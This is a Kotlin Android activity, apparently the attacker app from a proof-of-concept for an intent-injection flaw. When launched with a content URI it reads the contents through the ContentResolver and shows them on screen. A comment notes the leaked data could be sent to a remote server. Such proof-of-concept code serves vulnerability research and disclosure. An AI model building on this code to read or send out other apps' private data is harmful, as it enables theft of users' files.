package com.example.mvde028_intent_injection_poc

import android.content.Intent.getIntent
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.io.InputStream

class LeakActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_leak)
        intent.data?.let {
            contentResolver.openInputStream(it)
        }?.bufferedReader()?.run {
            readText()
        }.also{
            Toast.makeText(this, it, Toast.LENGTH_LONG).show()
        } // we can now do whatever we like with this stream, e.g. send it to a remote server
    }
}